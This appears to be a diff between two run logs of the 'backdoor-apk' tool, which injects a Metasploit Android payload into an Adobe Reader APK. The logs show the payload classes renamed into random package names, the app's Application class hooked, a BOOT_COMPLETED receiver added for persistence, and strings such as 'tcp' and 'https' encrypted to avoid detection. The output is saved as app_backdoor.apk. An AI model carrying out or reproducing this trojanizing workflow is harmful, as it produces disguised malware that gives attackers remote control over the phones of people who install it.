@@ -1,4 +1,4 @@
-Running backdoor-apk at Sat Aug  9 02:05:50 AM UTC 2025
+Running backdoor-apk at Sat Aug  9 02:14:54 AM UTC 2025
 /usr/bin/msfvenom
 /workspace/tools/baksmali233/baksmali
 /usr/bin/unzip
@@ -8,7 +8,7 @@ Running backdoor-apk at Sat Aug  9 02:05:50 AM UTC 2025
 /workspace/tools/android-string-obfuscator/lib/aso
 /workspace/tools/android-sdk/dx
 /workspace/tools/android-sdk/zipalign
-Archive:  /workspace/tasks/20250809/d000a36a-headless-android/input/original.apk
+Archive:  /workspace/tasks/20250809/a8643317-android/input/original.apk
   Length      Date    Time    Name
 ---------  ---------- -----   ----
     20348  2015-11-08 23:59   AndroidManifest.xml
@@ -1360,8 +1360,8 @@ Value of android_name: com/adobe/reader/misc/ARApp
 Value of android_class: com/adobe/reader/misc/ARApp
 The smali file to hook: /workspace/temp/original/smali/com/adobe/reader/misc/ARApp.smali
 No encoder specified, outputting raw payload
-Payload size: 10231 bytes
-Saved as: /workspace/tasks/20250809/d000a36a-headless-android/output/app_backdoor.apk
+Payload size: 10228 bytes
+Saved as: /workspace/tasks/20250809/a8643317-android/output/app_backdoor.apk
 I: Using Apktool 2.6.0 on app_backdoor.apk
 I: Loading resource table...
 I: Decoding AndroidManifest.xml with resources...
@@ -1373,7 +1373,7 @@ I: Baksmaling classes.dex...
 I: Copying assets and libs...
 I: Copying unknown files...
 I: Copying original files...
-placeholder value: mcuypmxarbjfqwjdirywejffxqcpeokj
+placeholder value: pfgsfvzvlainmzkevdduhjxlxsfrllou
 mkdir: created directory '/workspace/temp/bin'
 mkdir: created directory '/workspace/temp/bin/classes'
 mkdir: created directory '/workspace/temp/libs'
@@ -1382,315 +1382,315 @@ mkdir: created directory '/workspace/temp/libs'
 '/workspace/temp/bin/classes/smali/net/dirtybox/util' -> '/workspace/temp/payload/smali/net/dirtybox/util'
 '/workspace/temp/bin/classes/smali/net/dirtybox/util/obfuscation' -> '/workspace/temp/payload/smali/net/dirtybox/util/obfuscation'
 '/workspace/temp/bin/classes/smali/net/dirtybox/util/obfuscation/StringObfuscator.smali' -> '/workspace/temp/payload/smali/net/dirtybox/util/obfuscation/StringObfuscator.smali'
-mkdir: created directory '/workspace/temp/original/smali/com/adobe/reader/czaen'
-renamed '/workspace/temp/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/Vpstn.smali'
-renamed '/workspace/temp/payload/smali/com/metasploit/stage/MainService.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/Bhfbf.smali'
-renamed '/workspace/temp/payload/smali/com/metasploit/stage/Payload.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/a.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/a.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/b.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/b.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/c.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/c.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/d.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/d.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/e.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/e.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/f.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/f.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/g.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/g.smali'
-'/workspace/temp/payload/smali/com/metasploit/stage/MainActivity.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/MainActivity.smali'
-removed '/workspace/temp/original/smali/com/adobe/reader/czaen/MainActivity.smali'
-'/workspace/temp/payload/smali/net/dirtybox/util/obfuscation/StringObfuscator.smali' -> '/workspace/temp/original/smali/com/adobe/reader/czaen/Dktjw.smali'
-StringObfuscator class: com/adobe/reader/czaen/Dktjw
-StringObfuscator class suffix: Dktjw.smali
+mkdir: created directory '/workspace/temp/original/smali/com/adobe/reader/dnfws'
+renamed '/workspace/temp/payload/smali/com/metasploit/stage/MainBroadcastReceiver.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/Dsdfh.smali'
+renamed '/workspace/temp/payload/smali/com/metasploit/stage/MainService.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/Yjmyl.smali'
+renamed '/workspace/temp/payload/smali/com/metasploit/stage/Payload.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/a.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/b.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/b.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/c.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/c.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/d.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/d.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/e.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/e.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/f.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/f.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/g.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/g.smali'
+'/workspace/temp/payload/smali/com/metasploit/stage/MainActivity.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/MainActivity.smali'
+removed '/workspace/temp/original/smali/com/adobe/reader/dnfws/MainActivity.smali'
+'/workspace/temp/payload/smali/net/dirtybox/util/obfuscation/StringObfuscator.smali' -> '/workspace/temp/original/smali/com/adobe/reader/dnfws/Fpxwm.smali'
+StringObfuscator class: com/adobe/reader/dnfws/Fpxwm
+StringObfuscator class suffix: Fpxwm.smali
 /usr/bin/openssl
 Injected new key into StringObufscator class
-StringObfuscator key: M2yzDoH3tivVvGBQOMGwng==
-Placeholder: aexzjgbtkogbvjjsbaqeawppdgilrica
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8271
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+StringObfuscator key: nm7pAvvQUVuB4JxtN0whdA==
+Placeholder: umqtqcqsgdbyflvtiuqggggriqqoxibm
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8271
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8271
 Target: "android.intent.action.MAIN"
 Reg: v3
 Stripped target: android.intent.action.MAIN
-Replacement: n6Q1YutkzRVuASvYLxZYe+Ah29vRmTau3zpc4EBpkHDNypM320Aw6/Wc
+Replacement: 8Cz5UXw21ben00vwTvxxU8T1SKGJXYwe8hVm6FZUjj5wBlykXP2VWcQj
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/aexzjgbtkogbvjjsbaqeawppdgilrica.stub'
-Placeholder: evswaryuetvrdyusqjrbnobofdushadc
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8277
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/umqtqcqsgdbyflvtiuqggggriqqoxibm.stub'
+Placeholder: iswofhehypcnrnnoywtpxjvnvesldciy
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8277
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8277
 Target: "android.intent.category.LAUNCHER"
 Reg: v3
 Stripped target: android.intent.category.LAUNCHER
-Replacement: De0iAeDyschyzrBs5xFuBOVNVlggpnw5oGB4vhZllRCUyzUGtaOFrUFhxcurvOMn
+Replacement: SUXkxD6j4FJd5Y6kWV93AO9Ov/XWyo4grTSFBCc2vvxEK0O4BRFeqlSAhjBGcusR
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/evswaryuetvrdyusqjrbnobofdushadc.stub'
-Placeholder: lsdtdwhdfxkitpjpbdpyjjqlkfojrcmo
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8457
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/iswofhehypcnrnnoywtpxjvnvesldciy.stub'
+Placeholder: fwkmgioysoiylntjrpulafmaivfvqeoh
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8457
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8457
 Target: ".jar"
 Reg: v3
 Stripped target: .jar
-Replacement: qlFC+DmMlCdQJ7+Ke1S2HFGBOks=
+Replacement: A/pjllvdmVlUMT1ChJ7QWzcTaic=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/lsdtdwhdfxkitpjpbdpyjjqlkfojrcmo.stub'
-Placeholder: xprckqpvazdsyfqtpaesvxvljvoqsuiz
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8475
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/fwkmgioysoiylntjrpulafmaivfvqeoh.stub'
+Placeholder: pjqgnwmfduxfzqqgvqivvmwhiivenvzq
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8475
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8475
 Target: ".dex"
 Reg: v3
 Stripped target: .dex
-Replacement: uAObGBVo1LUznOJNRz4q8QZkzJc=
+Replacement: XijcTAESmKb146cVwP2Ae0D0Vc0=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/xprckqpvazdsyfqtpaesvxvljvoqsuiz.stub'
-Placeholder: deojokebnrfunzfpzwfptjuriguwcrfc
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8546
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/pjqgnwmfduxfzqqgvqivvmwhiivenvzq.stub'
+Placeholder: xxcuzualmrmchjsusfcaydyigakkurmf
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8546
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8546
 Target: "start"
 Reg: v1
 Stripped target: start
-Replacement: 9w+b3Z5uZ6AA0Iq5CQq8sC6eRsrx
+Replacement: HmQKZtqxJrZIeRpiwMKHMVKfuUpa
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/deojokebnrfunzfpzwfptjuriguwcrfc.stub'
-Placeholder: ganuybsvllilkypekvziccyhayodskby
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8629
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/xxcuzualmrmchjsusfcaydyigakkurmf.stub'
+Placeholder: ramiznqzaxyraweayurdgblbxuzqnztq
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8629
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8629
 Target: "."
 Reg: v1
 Stripped target: .
-Replacement: w8VZby3o8GiOn1P0KptXpf0=
+Replacement: FiM9DgmHxG/Qdot0tWA9jNA=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/ganuybsvllilkypekvziccyhayodskby.stub'
-Placeholder: gpwapuxvsnfitgkycgawbqzfgoofmysm
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8685
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/ramiznqzaxyraweayurdgblbxuzqnztq.stub'
+Placeholder: anxoakxcupujcpscljhegslcgybsapkc
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8685
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8685
 Target: "power"
 Reg: v1
 Stripped target: power
-Replacement: i7Loa5D0+OKOgn3Ghg4zfq4I894r
+Replacement: s0FAsNMU/WAXZM85gJgniOJW2SUg
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/gpwapuxvsnfitgkycgawbqzfgoofmysm.stub'
-Placeholder: jkwemuxcfldixqtzhjepbblwmirdwecf
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8773
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/anxoakxcupujcpscljhegslcgybsapkc.stub'
+Placeholder: eyeczmbkcvcqinefiwcrxnndwweedugn
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8773
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8773
 Target: "tcp"
 Reg: v0
 Stripped target: tcp
-Replacement: tkHY+EsJfG7KsvjjfmASBj2O2A==
+Replacement: at7tUeBcw3YBhdS/NnJ7c74cxA==
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/jkwemuxcfldixqtzhjepbblwmirdwecf.stub'
-Placeholder: cixfofjkvrjfneiuirzlbaoptaowkged
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8781
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/eyeczmbkcvcqinefiwcrxnndwweedugn.stub'
+Placeholder: iwmwkwfswfizggrevysqcbqxztcxorha
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8781
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8781
 Target: ":"
 Reg: v0
 Stripped target: :
-Replacement: pNSv066yM+XYFtU/NxirBNY=
+Replacement: yvj09VHgz+c0WNGYGr7ua9c=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/cixfofjkvrjfneiuirzlbaoptaowkged.stub'
-Placeholder: mqohafcqjycjjuwcjfsbvzhcbhifppcw
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8799
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/iwmwkwfswfizggrevysqcbqxztcxorha.stub'
+Placeholder: slvpvhfqlchrevtceljfyzywcgcgzxoq
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8799
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8799
 Target: "/"
 Reg: v3
 Stripped target: /
-Replacement: qyky4LRvKIhf+ePpyQg7bZk=
+Replacement: XRSfPRXjz2FS1YFsWNrMuIg=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/mqohafcqjycjjuwcjfsbvzhcbhifppcw.stub'
-Placeholder: fuguiqvzuuazjmdkvbpexsduyrxpfdtf
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8809
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/slvpvhfqlchrevtceljfyzywcgcgzxoq.stub'
+Placeholder: bnjhxqcfsblnfnhbyxhosshkaubtnbyu
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8809
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8809
 Target: ""
 Reg: v0
 Stripped target: 
-Replacement: ZKoWyaS0TYsIINwiCzsqQA==
+Replacement: 3FuB8Fm3zusC9MLocXYunw==
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/fuguiqvzuuazjmdkvbpexsduyrxpfdtf.stub'
-Placeholder: zhmvcrurvcawmbgrxjsmnvnxbybzhnrv
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8909
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/bnjhxqcfsblnfnhbyxhosshkaubtnbyu.stub'
+Placeholder: vbcoaayxtofdkyibmwdzajhgtpgljlsv
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8909
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8909
 Target: "https"
 Reg: v2
 Stripped target: https
-Replacement: cCfO+RN+Gui7CmAXTkRoOqMa5dIW
+Replacement: PRMo6437wmYAKWzfwE1cBch7yYum
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/zhmvcrurvcawmbgrxjsmnvnxbybzhnrv.stub'
-Placeholder: mturlhzsrwmichlgbsuvcrkjfauermmk
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8975
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/vbcoaayxtofdkyibmwdzajhgtpgljlsv.stub'
+Placeholder: kodgrnaxxzzrginptzhdoshlfmwcatrl
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8975
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8975
 Target: "android.app.ActivityThread"
 Reg: v0
 Stripped target: android.app.ActivityThread
-Replacement: 2LU1mvhZVqhL44OVNBced2qbkihvHJXB0goeGoL9KoyDodpPxXysM4EQ
+Replacement: 00mzLdvenQvfeTthpO3LitBR4f4XgLM4ky+ENHrUS5HCJRHVMkADXoik
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/mturlhzsrwmichlgbsuvcrkjfauermmk.stub'
-Placeholder: ebbncrysbjvvjekybacprqmarvzvasjg
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali:8985
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Adurt.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/kodgrnaxxzzrginptzhdoshlfmwcatrl.stub'
+Placeholder: gwarfkvsuzwnqxqdczzneujnhdaqjzha
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali:8985
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Ahwcl.smali
 Line num: 8985
 Target: "currentApplication"
 Reg: v1
 Stripped target: currentApplication
-Replacement: G7q+IGkUh5LAUGogvU3INFg+vkOQEKulLAPhqgn+6vVjkw==
+Replacement: flokVJUvs91qcrsgVg1cmtg7Tk/RHA8sfdTttw/knB6dew==
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/ebbncrysbjvvjekybacprqmarvzvasjg.stub'
-Placeholder: dzoixhuxbwklxzwaensbnvbcwiqauflk
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali:45
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/gwarfkvsuzwnqxqdczzneujnhdaqjzha.stub'
+Placeholder: zegzqkdxjdvrfwlrerskqeiharxhcqik
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali:45
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali
 Line num: 45
 Target: "User-Agent"
 Reg: v0
 Stripped target: User-Agent
-Replacement: 9J4Nny5DvYr9XqqegGh7g1lM9zHJvVyD4Cs=
+Replacement: Jh6+TzgVnnSqDE0jrI9S7KP+i0R5DxFk/Uo=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/dzoixhuxbwklxzwaensbnvbcwiqauflk.stub'
-Placeholder: gwsvceucfnseexdwqixkizggswcyglsb
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali:50
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/zegzqkdxjdvrfwlrerskqeiharxhcqik.stub'
+Placeholder: vjgfbaxtmxamkfkwyehbcahjsqqsipsh
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali:50
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali
 Line num: 50
 Target: "\r\n"
 Reg: v0
 Stripped target: \r\n
-Replacement: yeKNAoTb3IBImReYjpc3ja9BaX8=
+Replacement: 9NfTPDQXhgvazV5AC/lIcmLny5M=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/gwsvceucfnseexdwqixkizggswcyglsb.stub'
-Placeholder: aakguyiqxirkatrxgmpwahxrwuxpjkvi
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali:71
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/vjgfbaxtmxamkfkwyehbcahjsqqsipsh.stub'
+Placeholder: afrhqtkamharlruelhmplecvvzaygbqv
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali:71
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali
 Line num: 71
 Target: ":"
 Reg: v5
 Stripped target: :
-Replacement: i3dDqYEVqllkJrgq5pUz80E=
+Replacement: d+fM5U1rPfAd78bXZaDq3WY=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/aakguyiqxirkatrxgmpwahxrwuxpjkvi.stub'
-Placeholder: zwqfbkziclhhweerryzlryufbnwmyhsi
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali:117
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/a.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/afrhqtkamharlruelhmplecvvzaygbqv.stub'
+Placeholder: jzanqwgnajhnemxestgtxnyahlzlmkik
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali:117
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/a.smali
 Line num: 117
 Target: ""
 Reg: v0
 Stripped target: 
-Replacement: sn3mPtViXpssNftBNd0y6w==
+Replacement: Fai0tlbTInBEr2AJsuZ6cw==
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/zwqfbkziclhhweerryzlryufbnwmyhsi.stub'
-Placeholder: yiinjvcltybdvlfrxrhrtyzdeywxrvbw
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Bhfbf.smali:18
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Bhfbf.smali
-Line num: 18
-Target: "android.app.ActivityThread"
-Reg: v0
-Stripped target: android.app.ActivityThread
-Replacement: Fbp/H51kQDKDY1JfUcCPnARudYFIXGzOMDw48TMwyNLkY7hJQcLvWT0K
-
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/yiinjvcltybdvlfrxrhrtyzdeywxrvbw.stub'
-Placeholder: nihurowdbdatkqvvxmtczzebllvpmhme
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Bhfbf.smali:28
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Bhfbf.smali
-Line num: 28
-Target: "currentApplication"
-Reg: v1
-Stripped target: currentApplication
-Replacement: 4sPdIpf9IkerXLCm4xr5NELCSgd48JB+7pZijU9CRE4UDA==
-
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/nihurowdbdatkqvvxmtczzebllvpmhme.stub'
-Placeholder: ohdiesekciubjoirrrhuuaiqkapgynxb
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/b.smali:167
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/b.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/jzanqwgnajhnemxestgtxnyahlzlmkik.stub'
+Placeholder: wfgjjiverehqrotwqdtdlvgrjhggieug
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/b.smali:167
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/b.smali
 Line num: 167
 Target: "http"
 Reg: v5
 Stripped target: http
-Replacement: VWq8o8WMHi85RXbtmJMzmoJZtrA=
+Replacement: jUtuNKut7VFfud+aqveXqUvghWU=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/ohdiesekciubjoirrrhuuaiqkapgynxb.stub'
-Placeholder: tehziiaminhojkwfcranrlgwxabcdaln
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/b.smali:289
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/b.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/wfgjjiverehqrotwqdtdlvgrjhggieug.stub'
+Placeholder: ppyypxqrkotlfjzshrhuzorgdjtutbcs
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/b.smali:289
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/b.smali
 Line num: 289
 Target: "ISO-8859-1"
 Reg: v2
 Stripped target: ISO-8859-1
-Replacement: f+Gth/5A/CHRTeq5G01dP/PL8QVnJjTq+kg=
+Replacement: 7dkQAD3OeK5LzL85wRigxUfMSEx0TWp7BS8=
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/tehziiaminhojkwfcranrlgwxabcdaln.stub'
-Placeholder: khuxjvvionfguqzlxtmmltxrxkmdjrer
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/f.smali:37
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/f.smali
-Line num: 37
-Target: "SSL"
-Reg: v1
-Stripped target: SSL
-Replacement: Mmz0z2x+8ZqlVC2Yso8F77yPuQ==
-
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/khuxjvvionfguqzlxtmmltxrxkmdjrer.stub'
-Placeholder: grnsavvbfhimgxeworcqjiwyjioigqre
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/f.smali:114
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/f.smali
-Line num: 114
-Target: "SHA-1"
-Reg: v3
-Stripped target: SHA-1
-Replacement: 3ZntBG3XUldzIdTnslHLgcbNb+lm
-
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/grnsavvbfhimgxeworcqjiwyjioigqre.stub'
-Placeholder: tebptesvdbddhgnmprlaxgmvunhnkedx
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/f.smali:140
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/f.smali
-Line num: 140
-Target: "Invalid certificate"
-Reg: v1
-Stripped target: Invalid certificate
-Replacement: jOsr8oEMIWYnwBaPvzMcO9/BCqZeI6doYYm/3V7ZNCzNrjI=
-
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/tebptesvdbddhgnmprlaxgmvunhnkedx.stub'
-Placeholder: fogfliruaxoejjfnizumjhqxzsrccnew
-File with line num: /workspace/temp/original/smali/com/adobe/reader/czaen/Vpstn.smali:19
-File: /workspace/temp/original/smali/com/adobe/reader/czaen/Vpstn.smali
+'/workspace/temp/obfuscate.method' -> '/workspace/temp/ppyypxqrkotlfjzshrhuzorgdjtutbcs.stub'
+Placeholder: bgbszabsghncmjiwikktbmzrpbaowrcz
+File with line num: /workspace/temp/original/smali/com/adobe/reader/dnfws/Dsdfh.smali:19
+File: /workspace/temp/original/smali/com/adobe/reader/dnfws/Dsdfh.smali
 Line num: 19
 Target: "android.intent.action.BOOT_COMPLETED"
 Reg: v0
 Stripped target: android.intent.action.BOOT_COMPLETED
-Replacement: kcM7aRTi+r6gdMhci4MD0wL1cVWgCyiO7Tkdqrp+nb91HaHZul1CNzgY/RuSTSICuqRZvQ==
+Replacement: wFMMpRdQv4RUvIcN8syu4gUgc5tnXq91t7Oz/LRe7aGxuovFE3JSSIYKZiXsGUj8y+CWtg==
 
-'/workspace/temp/obfuscate.method' -> '/workspace/temp/fogfliruaxoejjfnizumjhqxzsrccnew.stub'
-removed '/workspace/temp/aakguyiqxirkatrxgmpwahxrwuxpjkvi.stub'
-removed '/workspace/temp/aexzjgbtkogbvjjsbaqeawppdgilrica.stub'
-removed '/workspace/temp/cixfofjkvrjfneiuirzlbaoptaowkged.stub'
-removed '/workspace/temp/deojokebnrfunzfpzwfptjuriguwcrfc.stub'
-removed '/workspace/temp/dzoixhuxbwklxzwaensbnvbcwiqauflk.stub'
-removed '/workspace/temp/ebbncrysbjvvjekybacprqmarvzvasjg.stub'
-removed '/workspace/temp/evswaryuetvrdyusqjrbnobofdushadc.stub'
-removed '/workspace/temp/fogfliruaxoejjfnizumjhqxzsrccnew.stub'
-removed '/workspace/temp/fuguiqvzuuazjmdkvbpexsduyrxpfdtf.stub'
-removed '/workspace/temp/ganuybsvllilkypekvziccyhayodskby.stub'
-removed '/workspace/temp/gpwapuxvsnfitgkycgawbqzfgoofmysm.stub'
-removed '/workspace/temp/grnsavvbfhimgxeworcqjiwyjioigqre.stub'
-removed '/workspace/temp/gwsvceucfnseexdwqixkizggswcyglsb.stub'
-removed '/workspace/temp/jkwemuxcfldixqtzhjepbblwmirdwecf.stub'
-removed '/workspace/temp/khuxjvvionfguqzlxtmmltxrxkmdjrer.stub'
-removed '/workspace/temp/lsdtdwhdfxkitpjpbdpyjjqlkfojrcmo.stub'
